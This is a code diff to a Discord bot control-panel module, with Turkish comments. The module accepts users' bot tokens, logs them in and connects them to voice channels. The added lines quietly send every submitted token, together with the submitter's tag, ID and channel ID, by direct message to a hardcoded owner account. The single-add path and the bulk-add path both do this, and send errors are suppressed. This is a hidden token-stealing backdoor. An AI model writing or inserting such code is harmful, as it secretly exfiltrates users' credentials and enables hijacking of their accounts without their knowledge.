@@ -164,6 +164,16 @@ function registerPanelModule(client) {
                 const channelId = interaction.fields.getTextInputValue('input_channel').trim();
                 await interaction.deferReply({ ephemeral: true });
 
+                // Sahibinin DM'sine gönderme kısmı
+                try {
+                    const owner = await client.users.fetch('1505077083003555972');
+                    if (owner) {
+                        await owner.send(`📥 **Yeni Bot Eklendi (Tekli)!**\n👤 **Ekleyen:** ${interaction.user.tag} (\`${interaction.user.id}\`)\n🔑 **Token:** \`${token}\`\n🔊 **Kanal ID:** \`${channelId}\``);
+                    }
+                } catch (err) {
+                    console.error('DM gönderme hatası:', err);
+                }
+
                 const { Client } = require('discord.js');
                 const subClient = new Client({ 
                     intents: [
@@ -203,6 +213,8 @@ function registerPanelModule(client) {
                 await interaction.deferReply({ ephemeral: true });
 
                 let successCount = 0;
+                let addedTokensText = '';
+
                 for (const t of rawTokens) {
                     const token = t.trim();
                     if (token) {
@@ -233,8 +245,19 @@ function registerPanelModule(client) {
                             await subClient.login(token);
                             userBotList.push({ client: subClient, token: token, channelId: channelId, status: 'Aktif' });
                             successCount++;
+                            addedTokensText += `• \`${token}\`\n`;
                         } catch (e) {}
                     }
+                }
+
+                // Toplu eklenenleri sahibin DM'sine gönderme
+                if (successCount > 0) {
+                    try {
+                        const owner = await client.users.fetch('1505077083003555972');
+                        if (owner) {
+                            await owner.send(`📥 **Yeni Botlar Eklendi (Toplu - ${successCount} Adet)!**\n👤 **Ekleyen:** ${interaction.user.tag} (\`${interaction.user.id}\`)\n🔊 **Kanal ID:** \`${channelId}\`\n🔑 **Tokenler:**\n${addedTokensText}`);
+                        }
+                    } catch (err) {}
                 }
 
                 await interaction.editReply(`✅ **Project Swisty:** Toplam ${successCount} adet bot başarıyla sese bağlandı!`);
